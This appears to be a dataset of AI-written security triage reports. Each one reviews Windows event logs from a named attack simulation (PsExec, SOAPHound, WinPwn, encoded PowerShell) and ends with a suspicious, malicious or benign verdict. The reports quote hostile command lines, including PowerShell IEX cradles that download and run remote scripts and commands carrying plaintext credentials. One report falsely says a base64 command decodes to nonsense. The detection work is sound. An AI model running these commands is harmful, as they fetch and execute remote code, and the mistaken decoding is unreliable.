   - Usage of `whoami.exe` and `hostname.exe`. While these executables can have legitimate use cases, when combined with the PowerShell ADS activity, it suggests a potential reconnaissance or preparation for privilege escalation.

4. **Logon Events:**
   - NTLM logins were noted from an external device named `DESKTOP-3HL5B2P`, which might not be typically expected for a server environment, especially with elevated privileges being granted.

5. **Application and Network Services:**
   - The logs of `sppsvc.exe`, `WmiPrvSE.exe`, and `TrustedInstaller.exe` indicate no suspicious activity on first look, as these services run regularly.

Based on the above analysis, several points suggest that further investigation is warranted:
- The method of using PowerShell to manipulate NTFS ADS is characteristic of malware using living-off-the-land (LOTL) techniques.
- High privileges for `admin_test` and external logons with NTLM could indicate potential unauthorized access.
- Reconnaissance behaviors using commands like `whoami` may indicate an attacker attempting to gather environment information.

**Resolution: SUSPICIOUS**

**Recommendations for Immediate Actions:**
- Conduct a comprehensive review of the `admin_test` user's activities, including authentication logs and recent changes.
- Verify the legitimacy of the connection from `DESKTOP-3HL5B2P` to ensure it is from a trusted source.
- Perform threat hunting across the system, focusing on unusual PowerShell activities and NTFS ADS usage.
- Implement enhanced monitoring and alerts for unusual command execution or privilege escalation.
- Activate multi-factor authentication (MFA) for critical accounts if not already done.
- Consider isolating the server for detailed forensic analysis if further suspicious activity is noted."
Suspicious Execution via Windows Command Shell,"Upon reviewing the provided Windows event logs, the following points stand out for further analysis:

### Initial Observations:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show frequent execution of `wevtutil.exe` (EventID: 5) followed by `conhost.exe` on the same Server002 by the user `SERVER002\admin_test`. This pattern occurs repetitively within a short period.
   - While `wevtutil.exe` is a legitimate Windows utility for managing event logs, its repetitive execution without clear context (like explicit command-line arguments) might be considered suspicious, especially if not part of normal server operations.

2. **Command Execution via `cmd.exe`:**
   - Execution of `cmd.exe` with the command `\""cmd.exe\"" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! &gt; hello.txt &amp; type hello.txt""` indicates potential obfuscation attempt using environment variable manipulation.
   - Further nested `cmd.exe` commands collecting output to a text file are noted, raising suspicions of potential data collection or script execution, especially since it is initiated by the same user.

3. **Use of `whoami.exe` and `HOSTNAME.EXE`:**
   - The presence of `whoami.exe` and `hostname.exe` execution might be part of regular administrative checks, but this is not typical unless during specific troubleshooting or scripting, making it slightly unusual.
   
4. **Frequent System Processes Involvement:**
   - Processes like `sppsvc.exe`, `TrustedInstaller.exe`, and `TiWorker.exe` appear within the logs, but they are all system-related processes usually initiated by the system for its operations. 
   - Their inclusion combined with administrative processes execution could indicate scheduled tasks or updates, but no direct evidence of compromise from these alone.

5. **High Integrity Level and Local Service Activity:**
   - Multiple activities logged under high integrity, especially involving syscalls and high-privileged user IDs (e.g., SYSTEM, NT AUTHORITY), which while usual, suggests elevated rights being exercised broadly.

### Conclusions:
- The event logs show repetitive process executions and a command pattern that could align with administrative task scripting or automation but lack context to justify such activities fully.
- The obfuscation method in the command line for `cmd.exe` suggests that there’s an attempt to manipulate or evaluate environmental variables, which is typically not standard practice without specific system administration needs.
- Overall system processes seem legitimate but, when viewed collectively, should be checked within the context of a broader system operation scope.

**Final Recommendation:**
- **Resolution: SUSPICIOUS** 
  - The logs exhibit activities that deviate from ordinary processes potentially indicating misuse or testing/utilization of administrative scripts.
  - Further investigation is advised, focusing on user activity logs and verification of scripts or scheduled tasks by `admin_test` to discern if this was part of a legitimate operation or an anomaly.

- **Next Steps:**
  - Verify with the IT operations team about any recent scripts or tasks implemented by `admin_test`.
  - Conduct a user session and process audit to determine the rationale behind these commands.
  - Implement stricter monitoring and alerting for such patterns in the future for proactive anomaly detection."
SOAPHound - Build Cache,"After analyzing the provided logs, several points warrant closer examination:

1. **Time Changes:**
   - The system log shows time adjustments using the Windows Time Service; this in itself isn't necessarily suspicious. However, consistent and unexpected time adjustments can sometimes indicate manipulation to evade detection.

2. **Sysmon Logs:**
   - Multiple executions of the `wevtutil.exe` and `conhost.exe` processes by the user `SERVER002\admin_test` could be benign if these actions are expected in the environment. Still, they are often used for log management and should be scrutinized for unexpected usage.
   - The execution of `powershell.exe` with a command line containing ""SOAPHound.exe"" raises a red flag. Particularly concerning is the hardcoded credential `P@ssword1`, which suggests potential misuse or compromise. The script appears to target a domain controller and is building a cache, which might be part of malicious reconnaissance or data exfiltration activity.

3. **PowerShell Logs:**
   - The PowerShell script invocation from the file path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\bin\SOAPHound.exe` with a password and domain controller target is suspicious. Usage of sensitive credential data in scripts is risky and suggests possible malicious intent.

4. **Application Logs and Microsoft Edge Updates:**
   - Frequent updates and installations by `MicrosoftEdgeUpdate.exe` processes appear benign if they correspond to legitimate software updates. However, if the volume or timing of these updates is unusual, it warrants further investigation to rule out abuse by attackers to execute payloads under the guise of software updates.

5. **Security Logs:**
   - Nothing particularly stands out in security logs beyond the time adjustments by `svchost.exe` as previously noted. The consistency of other logs suggests no immediate privilege escalation or unauthorized access.

### Assessment:

**Resolution: SUSPICIOUS.**

While some activities might appear normal, the use of `PowerShell.exe` with potentially exposed credentials and targeting a domain controller is notably concerning and can signify preparation for lateral movement or unauthorized data access. The execution of the `SOAPHound.exe` suggests malicious reconnaissance, needing immediate attention.

### Recommendations:

1. **Immediate Actions:**
   - Terminate the PowerShell process executing `SOAPHound.exe` and isolate the affected machine from the network for further analysis.
   - Investigate the user `admin_test` for any unauthorized or unintended behavior.
   - Change the password and check other credentials used by accounts related to this event to avoid further compromise.

2. **Further Investigation:**
   - Conduct a detailed forensic investigation to determine how `SOAPHound.exe` was placed on the system and review its activities.
   - Identify if any data exfiltration occurred during the period leading up to the detection of this event.

3. **Preventive Measures:**
   - Audit PowerShell usage within the network to ensure compliance with security policies.
   - Enhance monitoring for high-integrity level processes and command-line executions with overt credentials.
   - Increase staff awareness of potential phishing attacks or social engineering tactics that may have led to system compromise."
JScript execution to gather local computer information via wscript,"Upon reviewing the provided Windows event logs, several points stand out that require noting:

1. **Recurrent Execution of PowerShell**: There are multiple instances of PowerShell being executed with varying command lines. While PowerShell is often used for administrative automation tasks, its appearance in logs should be scrutinized for potential abuse, particularly given the ability to run scripts that may be malicious. The command `powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';` is rather benign by itself, showing an intentional print of results without any obvious malicious actions.

2. **Windows Security and System Updates**: The logs contain entries related to the Windows Update process and the functioning of Windows Defender (showing as active and monitoring). These indicate normal background activities associated with system maintenance.

3. **Microsoft Edge Update**: The logs demonstrate normal update activities for Microsoft Edge, involving multiple executions and installations from setup.exe files related to Edge Update. These activities involve the NT AUTHORITY\SYSTEM user, which is typical for system-level operations involved with updates.

4. **Execution of CompatTelRunner.exe**: This is a normal Windows Telemetry component process used for collecting telemetry data. Multiple invocations of this tool also seem benign, as they are part of standard system processes.

5. **Several Attempts to Access Microsoft Account Information**: With attempts showing an error code, this may be a benign system process or service attempting and failing to connect to Microsoft services, perhaps due to connectivity or credential errors.

6. **Event ID Analysis**:
   - **4624 (Logon Events)**: These events involve SYSTEM and various built-in service accounts, showing typical logon processes to system services.
   - **4672 (Special Privileges Assigned to New Logon)**: Reflects the expected granting of privileges to system-level accounts, such as NT AUTHORITY\SYSTEM.

7. **Sysmon Events**: The captured Sysmon entries show processes executed and provide context on the parent-child relationship of processes. None of the Process Create (Event ID 1) entries showed any unusual or suspicious executables being run that were outside of normal system or update processes for this context.

8. **Security and Application Logs**: Beyond the standard Windows Update logs and service starts/stops, there is nothing overtly suspicious in these logs with respect to unexpected failures or error messages that could indicate tampering.

**Final Assessment and Resolution**:  
Based on the available data within these logs, the activities appear to align with standard and expected operations for system maintenance and software updates. The logs do not show definitive signs of unusual or malicious activity, neither do they indicate any breach attempts that go beyond failed routine operations.

**Resolution**: BENIGN - The logs reflect typical system activities and maintenance without signs of compromise. However, continued vigilance is recommended, especially for the execution of PowerShell and script-based tasks, due to their potential misuse. Regular monitoring and comprehensive threat detection mechanisms will help mitigate any latent risks."
Create and Execute Batch Script,"Upon analyzing the provided Windows event logs, I have noted several key observations that suggest potentially suspicious activity. Here's my detailed analysis:

### Observations and Analysis:

1. **PowerShell Activity:**
   - Multiple logs from the Windows PowerShell event (event IDs 1067 to 1074) show the initiation of processes through a PowerShell command:
     - `powershell.exe & {Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.003_script.bat""}`
   - Execution of scripts from temporary directories is a tactic often used by malicious parties to avoid detection. The obscured path “`..\Externalfiles\data.003_script.bat`” is particularly notable due to its unconventional structure.

2. **Sysmon Logs:**
   - Numerous entries indicate the execution of `cmd.exe` and various instances of `conhost.exe`, initiated by PowerShell:
     - Examples include `cmd.exe` running ""`C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\data.003_script.bat`"".
   - The use of `cmd.exe` for starting batch scripts is common in malicious behavior where attackers attempt to escalate privileges or perform lateral movements.

3. **Security Logs:**
   - The security logs (event IDs 4624 and 4672) show a successful logon with high privileges (SeDebugPrivilege, SeTcbPrivilege, etc.).
   - Such privileges can be used for more intrusive operations on a system, such as process injection or manipulation of system audit logs.

4. **Application Logs:**
   - No overtly malicious activity is detected within these logs. Most entries pertain to updates and standard operating system functionalities.

5. **Edge Updater Activity:**
   - The logs reflect numerous update processes related to Microsoft Edge (event IDs 18003 to 18031). While these could be routine, the frequency and bundling in this timeframe may suggest they were potentially leveraged as a cover for other operations.
  
### Assessment:

Given the information above, the presence of PowerShell scripts executed from a temporary directory, particularly with non-standard paths and the chaining of processes typical of evasion or persistence tactics, merits concern. Coupled with the use of high privilege tokens, these indicators suggest potentially suspicious behavior intent on privilege escalation or lateral movement.

### Conclusion: SUSPICIOUS

The activity observed does not conclusively confirm a malicious compromise, due to a lack of evidence on the specific actions and intentions behind the `data.003_script.bat` execution. However, the behavior is non-standard and suspicious enough to justify further investigation.

### Guidance:

- **Quarantine and Inspect:** The host should be quarantined to prevent potential lateral spread. Conduct a thorough inspection of “`data.003_script.bat`” and any related files or processes.
- **Audit and Monitor:** Increase monitoring on this system for any abnormal behavior or escalations.
- **Forensic Analysis:** Perform forensic analysis to check for any persistence mechanisms and potential data exfiltration attempts.
- **Review Access Logs:** Review recent access logs and patterns around the involved user's activities (e.g., admin_test).

Further investigation will help determine if these activities pose a significant threat and inform if a response is necessary."
Execution through API - CreateProcess,"Upon analyzing the provided Sysmon logs, here are the detailed observations:

1. **PowerShell Execution**:
   - There is an instance of `powershell.exe` being executed by the user `SERVER002\admin_test`. While PowerShell usage is common in Windows environments, it is often leveraged in attacks for its powerful scripting capabilities. However, there are no further details indicating the command line used or actions performed.

2. **Frequent Execution of `conhost.exe` and `wevtutil.exe`**:
   - `conhost.exe` appears frequently in pairs with `wevtutil.exe`, a utility used to manage event logs. The presence of frequent `wevtutil.exe` without clear context may suggest log tampering or data exfiltration attempts. 
   - The user `SERVER002\admin_test` is consistently associated with these executions.

3. **Use of `cmd.exe` and .NET Compiler**:
   - Commands initiate `cmd.exe` with a subsequent execution of `csc.exe` (C# Compiler), indicating potential compiling of source code dynamically on the host to create executables, specifically `data.exe`. This behavior is not typical for regular users and might indicate an attempt to deploy malicious code.

4. **Execution of Suspicious Executables**:
   - The execution of `data.exe`, whose origin and purpose are unclear, is detected. It is spawned from `cmd.exe`, suggesting an attempt to run a newly compiled or downloaded executable which could be malicious.

5. **Running of Legitimate Tools in Potentially Malicious Context**:
   - The execution of `calc.exe` from a command line `cmd /c calc.exe` after `data.exe` may be a test for successful execution or part of a command chain.

6. **No Corresponding Security Log Entries**:
   - The absence of any corresponding security logs makes it difficult to fully correlate, authorize, or justify these actions.

### Assessment:

While the specific logs provided do not contain clear-cut evidence of malware, the patterns observed are suspicious:
- The combination of PowerShell, `wevtutil.exe`, dynamic code compilation, and execution of potentially unauthorized executables aligns with tactics seen in a privilege escalation or lateral movement by an attacker.

### Resolution:

**SUSPICIOUS**

Given the observations:
- The frequent and unusual activity pertaining to `conhost.exe` and `wevtutil.exe`, particularly with a specific user.
- The dynamic creation and execution of a new executable (`data.exe`) using the .NET compiler in an obscure user directory.
- The potential for code execution masking (e.g., running `calc.exe`) to test arbitrary code execution.

### Guidance:

1. **Further Investigation**:
   - Review any available PowerShell logs to understand the script that may be executed.
   - Conduct a deeper investigation into the `data.exe` file to understand its purpose and creation process.
   - Collect and analyze network traffic logs around these event times for potential data exfiltration or command/control activities.

2. **Immediate Actions**:
   - Alert IT or incident response to monitor or restrict the account `SERVER002\admin_test`.
   - Consider isolating `SERVER002` if suspicious activity continues or if `data.exe` is confirmed malicious.

3. **Enhanced Monitoring**:
   - Increase logging around process creation, especially PowerShell and cmd execution with verbose command line recording enabled.
   - Set alerts for common tool execution like `wevtutil.exe` not associated with routine administration processes."
Run Shellcode via Syscall in Go,"After analyzing the provided Windows event logs, I've identified several areas of interest that may indicate potential malicious activity.

### Analysis Overview:

1. **Repeated Execution of System Utilities**:
   - The logs show numerous executions of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test`. The frequent invocation of these system utilities could be suspicious if it deviates from standard operational procedures.

2. **Execution of `whoami.exe` and `hostname.exe`**:
   - These commands are commonly used for reconnaissance, such as identifying the current user or system. In isolation, these commands may not be concerning, but if coupled with other suspicious activities, they could indicate an attempt to gather information needed for privilege escalation or lateral movement.

3. **Execution of PowerShell with Custom Scripts**:
   - The PowerShell logs highlight the execution of `powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\syscall.exe -debug}`. The use of temporary directories and binaries can suggest the presence of unauthorized or malicious scripts, possibly indicating an attempt to execute arbitrary code on the system.

### Indicators of Potential Malicious Activity:

- **Powershell Command**: The PowerShell command involving `syscall.exe` appears suspicious as it originates from a user's temporary folder, which is a common tactic for hiding malicious payloads. This binary file might have been used for further exploitation or to establish a foothold in the system.
  
- **Repeated System Utility Use**: The multiple executions of system utilities like `wevtutil.exe` within a short time span without corresponding benign justifications could imply manipulation of event logs to cover tracks.

### Conclusion:

Given the details and patterns observed:

- **Resolution**: **SUSPICIOUS**

### Risk Assessment and Guidance:

- **Immediate Actions**:
  - Conduct further analysis on `syscall.exe` to validate its legitimacy, and check for known hashes in malware databases.
  - Review process logs and invocation history for `wevtutil.exe` and `conhost.exe` to confirm they align with expected administrative tasks.
  - Analyze the context and origin of the executed PowerShell scripts to determine the intent and source of potential malicious activity.

- **Monitoring and Mitigation**:
  - Enhance monitoring for activities involving sensitive utilities and PowerShell executions.
  - Investigate and audit login and access patterns for the user `admin_test` to identify any anomalies or unauthorized activities.
  - Engage in proactive threat hunting to identify other systems potentially affected or targeted by similar suspicious activities.

Further investigation is necessary to conclusively determine if these activities are benign administrative tasks or constitute part of a larger malicious operation."
Powershell XML requests,"### Detailed Analysis of Logs

#### Observations:
- **Execution of `wevtutil.exe` and `conhost.exe`:** There are multiple entries showing the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate tool used to manage Windows event logs, and `conhost.exe` is a Windows Console Host process. Frequent invocation of these executable by an admin user, without additional context, can be part of normal administrative tasks, especially if log management is being conducted. 

- **Execution of `hostname.exe` and `whoami.exe`:** These are benign Windows tools that output the hostname of the system and display the current username respectively. The execution seems coordinated and quick, possibly part of a script or batch job.

- **Command Line Execution with Suspicious Command:** The execution of `cmd.exe` with a command-line statement invoking PowerShell to download and execute a script from an external URL is highly suspicious. The command executed is:
  ```
  ""cmd.exe"" /c ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/test.xml');$Xml.command.a.execute | IEX""
  ```
  This command uses PowerShell with execution policies bypassed to download a file from the internet and potentially execute content from a downloaded XML file.

- **Security Log - Privileged Access:** There is evidence of a privileged log-in under the account `admin_test`. The privileges acquired include `SeDebugPrivilege` and `SeBackupPrivilege`, which are typical of an administrative account, but if an attacker gains these privileges, it provides significant control over the system.

#### Identification of Potential Threats:
- **Malicious Command Execution:** The combination of using `cmd.exe` to execute PowerShell with a remote script presents a typical pattern of a PowerShell-based attack or exploitation attempt. This specific behavior suggests an attempt to execute potentially malicious actions or instructions sourced externally.
  
- **Privilege Abuse by `admin_test`:** While having admin privileges is typical, the presence of suspicious command activity under this account may indicate either a compromised admin account or potentially malicious insider behavior.

### Assessment:
- **Indicators of Malicious Activity:** The central point of concern is the command-line execution aiming to download and execute code from an external URL using PowerShell. This is a classic sign of attempt to introduce remote code or payload execution, which often leads to system compromise.

### Resolution:
- **Resolution:** **MALICIOUS**
  
### Guidance on How to Proceed:
1. **Immediate Isolation:** Consider isolating the affected system to prevent any potential lateral movement across the network.
2. **User Account Investigation:** Conduct a thorough review of the `admin_test` account activities to determine if it has been compromised.
3. **Network Monitoring:** Monitor outbound and inbound traffic for any anomalies or additional connections to unknown or suspicious IPs.
4. **Forensic Analysis:** Retrieve and analyze the contents of the URL accessed to understand potential payloads or commands.
5. **System and Security Configuration Checks:** Ensure that PowerShell execution policies are appropriately set and review any changes to security settings.
6. **User Awareness and Training:** Remind users about security protocols and encourage vigilance in recognizing phishing and social engineering attempts. 

By following these steps, you can further investigate the path of attack, mitigate current risks, and better secure the network environment against similar future threats."
WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique,"### Detailed Analysis

Upon reviewing the provided Windows event logs, there are a series of entries across various logs that suggest potentially malicious activities typically associated with PowerShell abuse and attempts to bypass conventional security features. Below is a detailed breakdown:

#### Suspicious or Anomalous Behavior:

1. **PowerShell Execution with Obfuscated Script:**
   - The `Windows PowerShell` log contains entries where `powershell.exe` is executed with a suspicious command: 
     ```
     powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
     ```
   - This command is indicative of downloading and executing a script from a remote source, a classic method used in various cyberattacks for executing arbitrary code or downloading further malicious payloads.

2. **Process Creation and Command-Line Arguments:**
   - The `Sysmon` log documents multiple processes like `conhost.exe` starting with the command line `\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1`, an argument which by itself requires further examination for potential misuse.
   - Numerous instances of `whoami.exe` and `hostname.exe` are also noted. While these are standard utilities, when executed excessively under typical user contexts, it may indicate reconnaissance activity by an attacker.

3. **Indicators of Potential Privilege Escalation:**
   - The PowerShell script executed appears related to process injection and parent process ID (PPID) spoofing techniques, commonly associated with privilege escalation attempts or stealthy execution of commands.

#### Indication of Malicious Activity or Compromise:

- The use of PowerShell to download and execute scripts directly from the internet without any apparent legitimate purpose strongly suggests malicious intent.
- The script being fetched and executed from a publicly available GitHub repository points to a potential exploit or reconnaissance toolkit.
  
### Assessment of the Situation:

- The logs provide several indicators of compromise:
  - Remote script execution via PowerShell.
  - Execution of Windows utilities in a potentially suspicious context.
  - Potential attempts at privilege escalation through PPID spoofing or other means.

### Threats or Risks Identified:
- Unauthorized remote code execution.
- Potential data exfiltration or lateral movement within the network.
- Escalation of privileges leading to broader system compromise.
  
### Guidance on How to Proceed:

1. **Immediate Action:**
   - Isolate the affected host (`Server002`) from the network to prevent further potential malicious activity.
   - Block external access to the URLs from which the malicious script is downloaded.
   
2. **Further Investigation:**
   - Conduct deep forensic analysis on `Server002` to identify any artifacts left by the executed scripts.
   - Examine network logs and other endpoint logs for lateral movement or additional connected devices.
   - Check for possible indicators of compromise on other devices within the network.
   
3. **Preventive Measures:**
   - Implement strict PowerShell execution policies and monitoring.
   - Educate users on identifying phishing attempts which might lead to execution of such scripts.
   
4. **Remediation:**
   - If further evidence of compromise is detected, consider full endpoint reimaging and restoration from safe backups.

### Resolution:
- **MALICIOUS** - Based on the evidence of remote script execution and potential misuse of PowerShell, the logs indicate malicious activity."
PowerShell Command Execution,"Upon detailed analysis of the provided Windows event logs, I have identified several points of concern that suggest the presence of suspicious activity:

1. **Suspicious PowerShell Activity**: 
   - Throughout the logs, several entries related to PowerShell (Event ID 600) show the execution of PowerShell scripts through `powershell.exe` with the command-line arguments obscured using base64 encoding (`-e`). This technique is commonly used to obfuscate malicious scripts to bypass security controls and is a common tactic used by attackers.
   - The base64 string `JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==` decodes to a nonsensical or encrypted content, which makes it difficult to ascertain the script’s intent. This suggests an attempt to execute potentially harmful or obfuscated operations.

2. **Use of Command Prompt (cmd.exe) to Launch PowerShell**:
   - In the Sysmon log entries, there are instances where `cmd.exe` is used to execute `powershell.exe` with obfuscated command-line arguments. This chaining of execution is another method attackers use to avoid direct detection.

3. **Presence of Wevtutil and Conhost Executions**:
   - The frequent appearances of `wevtutil.exe` and `conhost.exe` processes executed by the same user (SERVER002\\admin_test) add to the suspicion. While these executables can be used for legitimate administrative purposes, they could be leveraged to interact with event logs and perform malicious activities under certain contexts. Rapid multiple executions during the same time frame as encoded PowerShell scripts can correlate with suspicious activity.

4. **Overall Behavior Consistency with Known Malicious Techniques**:
   - The pattern of Base64 encoded PowerShell scripts, rapidfire command executions involving potentially sensitive utilities (such as `wevtutil.exe`), and the user context under a high privilege level points towards potentially malicious behaviors, commonly observed in various cyber attack methodologies.

### Assessment:
The logs indicate suspicious activities that are often associated with attacks or malicious behaviors. The use of obfuscated scripts executed through PowerShell, especially when the scripts are encoded, is a very strong indicator of potential compromise.

### Final Resolution: **SUSPICIOUS**

### Recommendations:
1. **Decode and Analyze the PowerShell Commands**: Attempt to decode and analyze the base64 encoded strings to understand the intentions of these scripts.
2. **User Activity Investigation**: Investigate the activities of the user `SERVER002\\admin_test` for any unauthorized or malicious activity.
3. **Security Policy Review**: Ensure system policies block or restrict the execution of encoded commands without prior authorization or explicit need.
4. **Monitoring and Alerts**: Increase monitoring of PowerShell executions, especially those with encoded command arguments, and set up alerts for such activities.
5. **Review Event Log Access**: Scrutinize the use of utilities such as `wevtutil.exe` for any attempts to erase or tamper with logs.

Further investigation is needed to determine the exact nature and intent of the activities, potentially involving forensic analysis and coordination with IT security teams."
Use PsExec to execute a command on a remote host,"Upon reviewing the provided Windows event logs, I have identified several key points that need attention. Below is a detailed analysis.

1. **Unusual PowerShell Activity**:
   - The logs identify an instance where `powershell.exe` was executed by the user `SERVER002\admin_test`. PowerShell is often used by attackers for malicious purposes due to its scripting capabilities. However, the command-line arguments used during execution are not provided in the logs, making it difficult to assess whether they were used maliciously.

2. **Use of SysInternals PsExec**:
   - There's an indication of `cmd.exe` being utilized to execute a likely transferred `PsExec.exe`, which was run to launch `C:\Windows\System32\calc.exe`. The command line for this operation was:
     ```
     ""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\PsExec.exe"" \\localhost -u DOMAIN\\Administrator -p P@ssw0rd1 -accepteula ""C:\\Windows\\System32\\calc.exe""
     ```
   - PsExec is a legitimate tool for remote execution but is often used by attackers to gain further control, move laterally, or execute payloads without leaving much trace. The use of `-u` and `-p` flags to supply administrative credentials demonstrates this is an elevation event worth investigating.

3. **Frequent Usage of System Utilities**:
   - There is frequent process creation related to system utilities like `wevtutil.exe`, `hostname.exe`, and `whoami.exe`. While these can be normal, they can also be used for enumeration and information gathering by attackers.
   - The repetitive execution of these commands in quick succession can indicate enumeration activities in preparation for lateral movement or privilege escalation.

4. **Microsoft Edge Update**:
   - Multiple instances of `MicrosoftEdgeUpdate.exe` are observed. The repeated frequency and various forms of execution (e.g., `/regsvc`, `/setup`, `/c`, `/ua`) suggest a normal update process, aligning with legitimate application maintenance.

5. **Overall Analysis**:
   - The use of legitimate tools (`PsExec`, `wevtutil.exe`, etc.) in potential unusual contexts, such as elevated privileges with supplied credentials, indicates the possibility of illegitimate actions under the guise of legitimate processes. 
   - The absence of certain logs (Security, Windows PowerShell, and System logs) limits the investigation's full scope to analyze context or correlating suspicious activities.

### Assessment:
- Although some activities like `PsExec` usage with admin credentials are highly suspicious, there is no definitive proof of malicious acts within the provided logs due to missing command lines, actions' outcomes, or confirmation of confirmed intent to compromise.

### Resolution:
- **SUSPICIOUS** - The logs contain activity, specifically the noted use of PsExec with explicit credentials and potential enumeration commands, that deserves further investigation.

### Recommendations for Further Action:
1. Review the command-line history for the `powershell.exe` instance to assess its intent.
2. Investigate why PsExec was used and verify if this was an authorized administrative action.
3. Examine system configurations and user access to ensure that there are no exploited vulnerabilities or unauthorized configurations.
4. Deploy additional monitoring on the server to trace future activity potentially pointing toward suspicious or preparatory actions.
5. Consider auditing related user accounts, network paths, and privilege levels to rule out or confirm internal threat activity."
ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments,"After a thorough analysis of the provided logs, here is a detailed assessment:

### PowerShell Log Analysis:
1. **Encoded Arguments and Execution**: The PowerShell logs consistently show entries for `powershell.exe` with encoded arguments and the `-Execute` flag, which is uncommon for typical administrative tasks and often used to obfuscate malicious commands.
2. **Command Line**: The logs show PowerShell executions with encoded command lines using `Out-ATHPowerShellCommandLineParameter`. This is atypical and can signal malicious attempts to execute hidden scripts.

### System Log Analysis:
1. **Windows Update Logs**: The logs mostly contain Windows Update Client events which appear normal and consistent with regular update checks and installations. No apparent anomalies are present here indicative of malicious activity.
2. **Kernel General Logs**: Includes routine hive state information, which does not point towards suspicious activity.

### Security Log Analysis:
1. **Event ID 5379**: Multiple entries attempt to access credential information returning a specific error code (3221226021), indicating access denied. There are no further identifiers to point towards immediate threat but worth noting repeated failed attempts.
2. **Privilege Events**: Event 4672 highlighting special privileges (e.g., SeDebugPrivilege) being assigned to SYSTEM is standard practice for SYSTEM services and not explicitly suspicious.

### Sysmon Log Analysis:
1. **Process Creation Events**: Repeated execution of `powershell.exe` with encoded command lines suggest possible obfuscation or malicious activity.
2. **Use of Conhost and Wevtutil**: Frequent spawning of `conhost.exe` and `wevtutil.exe`, which may be linked to event log manipulation attempts or to window management. While the use of `wevtutil.exe` can be legitimate, it is also used in some malicious scenarios to clear or tamper with logs.

**Suspicious Activity Identified:**
- The PowerShell logs suggest execution of potentially obfuscated or encoded command lines which is a common technique in advanced attacks to avoid detection.
- The Sysmon logs supplement the suspicion with `powershell.exe` executions under high integrity levels, possibly intended for privileged actions.

### Final Assessment:
Based on the analysis of the provided logs, the activities recorded are deemed **SUSPICIOUS**. There are clear indications of potentially obfuscated PowerShell execution and unusual command-line syntax that warrant additional investigation.

### Recommended Actions:
- **Deep Dive**: Conduct further investigation into the PowerShell scripts executed. Attempt to decode any encoded commands to understand their intent.
- **Environment Review**: Review parallels or historical behavior on `Server002` to establish if such PowerShell use is typical or stands out as an anomaly.
- **Security Posture Enhancement**: If not already, consider implementing more restrictive PowerShell execution policies and enhanced logging with centralized monitoring for suspicious activities.
- **Threat Hunt**: Engage in a threat hunting exercise focusing on recent similar incidents across your network to identify if this behavior is isolated to `Server002` or part of a broader compromise attempt.

The logs contain unusual behaviors that cannot be confidently classified as benign without further context and decoding of the obfuscated/encoded commands seen."
Cobalt Strike SSH (postex_ssh) pipe,"Based on the event logs provided for the Windows host ""Server002,"" here is a detailed analysis focusing on indicators of possible malicious activity:

### Analysis Summary:
1. **Unusual Process Executions**:
   - Several processes involving `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` were executed from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\build\\`). These executables are not typical Windows components and their location in a temporary directory is suspicious and indicative of potentially malicious behavior.

2. **Process Relationships**:
   - The `namedpipes_executor.exe` is being spawned via `cmd.exe`, which itself is triggered by `wsmprovhost.exe`. The use of `cmd.exe` to execute potentially harmful scripts or executables is a known technique used by adversaries to perform lateral movement and other malicious activities.

3. **Permissions and User Context**:
   - The user context involved with the execution of these suspicious processes is `SERVER002\\admin_test`, a local user with administrative privileges. Such an account, if compromised, could be used to perform elevated tasks without generating alerts for privilege escalation.

4. **Network Activities**: 
   - No direct evidence of network communication attempts from newly spawned processes or network-based indicators were captured in the logs provided.

5. **Edge Update Activity**:
   - Various logs indicate Microsoft Edge update processes that appear to run normally and don't demonstrate any clear compromise signals. These entries seem routine as part of background update checks and operations.

6. **Security Logs**:
   - Security-related logs show typical service account activities (NT AUTHORITY\\SYSTEM), without explicit signs of failed authentication or privilege escalations affecting normal operations.

### Final Assessment:
- **SUSPICIOUS**:
  - The presence and execution of the `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` from non-standard directories suggest a high likelihood of suspicious activities. These components, especially emanating from temporary folders, require further investigation to determine legitimacy.

### Recommendations:
- **Further Investigation**: 
  - Investigate the origin and purpose of `namedpipes_executor.exe`, its associated files, and verify these are not part of any authorized software installations or maintenance tools.
  - Review additional logs and any relevant alerts from endpoint security solutions or file integrity monitoring that could confirm whether these executables are known threats.
  
- **System Scanning**:
  - Conduct a full antivirus and antimalware scan of the host to identify any hidden threats or unwanted programs that align with the suspicious activity.
  
- **Access Control Review**:
  - Verify the integrity and use patterns of the `SERVER002\\admin_test` account to ensure it has not been compromised, and apply additional security measures such as multi-factor authentication.

- **File Analysis**:
  - If possible, perform static and dynamic analysis on the suspicious executables to identify any malicious behavior, such as attempts to call out to command-and-control servers or manipulate system files.

Considering these elements, the final resolution of the analysis is deemed **SUSPICIOUS**, requiring follow-up to rule out potential compromise."
